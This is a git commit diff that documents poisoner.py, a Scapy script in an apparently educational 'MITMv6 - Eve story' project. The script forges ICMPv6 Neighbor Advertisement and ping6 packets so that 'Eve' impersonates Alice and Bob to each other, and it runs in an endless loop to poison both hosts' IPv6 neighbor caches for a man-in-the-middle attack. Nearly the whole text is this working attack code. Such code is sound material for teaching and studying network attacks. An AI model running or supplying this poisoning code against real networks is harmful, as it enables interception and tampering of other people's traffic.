ab4711da7cd23c5035e268f10d3fc08dbd664367
SimchaTeich <sim.teich@gmail.com>
2022-08-21 15:09:42 +0300

    document the script

--- MITMv6/3 - Eve story/MITMv6_by_Eve/poisoner.py
+++ MITMv6/3 - Eve story/MITMv6_by_Eve/poisoner.py
@@ -3,6 +3,17 @@ import time
 from network_details import *
 
 def build_fake_na(victim_mac, victim_ip, target_ip):
+    """
+:   function build fake Neighbor Discovery NA packet.
+:   param victim_mac: the mac address of who will poison.
+:   type victim_mac: string
+:   param victim_ip: the ipv6 address of who will poison.
+:   type victim_ip: string
+:   param target_ip: ip will be in tgt field of NA packet.
+:   type target_ip: string
+:   return: the fake Neighbor Advertisment packet
+:   rtype: scapy packet
+    """
     ether = Ether(src=EVE_MAC, dst=victim_mac)
     ipv6 = IPv6(src=target_ip, dst=victim_ip)
     na = ICMPv6ND_NA(R=0,S=1,O=1,tgt=target_ip)
@@ -11,11 +22,32 @@ def build_fake_na(victim_mac, victim_ip, target_ip):
 
 
 def send_fake_na(victim_mac, victim_ip, target_ip):
+    """
+:   send the fake NA packet after building by parameters.
+:   param victim_mac: the mac address of who will poison.
+:   type victim_mac: string
+:   param victim_ip: the ipv6 address of who will poison.
+:   type victim_ip: string
+:   param target_ip: ip will be in tgt field of NA packet.
+:   type target_ip: string
+:   rtype: None
+    """
     fake_na = build_fake_na(victim_mac, victim_ip, target_ip)
     sendp(fake_na, verbose=0)
 
 
 def build_fake_ping6(victim_mac, victim_ip, target_ip):
+    """
+:   function build fake ping6 packet.
+:   param victim_mac: the mac address of who will poison.
+:   type victim_mac: string
+:   param victim_ip: the ipv6 address of who will poison.
+:   type victim_ip: string
+:   param target_ip: ip will be in tgt field of NA packet.
+:   type target_ip: string
+:   return: the fake Neighbor Advertisment packet
+:   rtype: scapy packet
+    """
     ether = Ether(src=EVE_MAC, dst=victim_mac)
     ipv6 = IPv6(src=target_ip, dst=victim_ip)
     icmpv6 = ICMPv6EchoRequest(id=1,seq=1,data='hey')
@@ -23,23 +55,45 @@ def build_fake_ping6(victim_mac, victim_ip, target_ip):
 
 
 def send_fake_ping6(victim_mac, victim_ip, target_ip):
+    """
+:   send the fake ping6 packet after building by parameters.
+:   param victim_mac: the mac address of who will poison.
+:   type victim_mac: string
+:   param victim_ip: the ipv6 address of who will poison.
+:   type victim_ip: string
+:   param target_ip: ip will be in tgt field of NA packet.
+:   type target_ip: string
+:   rtype: None
+    """
     fake_ping6 = build_fake_ping6(victim_mac, victim_ip, target_ip)
     sendp(fake_ping6, verbose=0)
 
 
 def poison_alice():
-    # ping6&na to alice "from bob"
+    """
+:   function send fake ping6 ("from Bob") and fake
+:   NA packets to Alice for cache poisoning
+    """
     send_fake_ping6(ALICE_MAC, ALICE_IPv6, BOB_IPv6)
     send_fake_na(ALICE_MAC, ALICE_IPv6, BOB_IPv6)
 
 
 def poison_bob():
-    # ping&na to bob "from alice"
+    """
+:   function send fake ping6 ("from Alice") and fake
+:   NA packets to Bob for cache poisoning
+    """
     send_fake_ping6(BOB_MAC, BOB_IPv6, ALICE_IPv6)
     send_fake_na(BOB_MAC, BOB_IPv6, ALICE_IPv6)
 
 
 def poison():
+    """
+:   function poison Alice & Bob
+:   together forever.
+:   one secode wating between
+:   poison to poison.
+    """
     while True:
         poison_alice()
         poison_bob()    
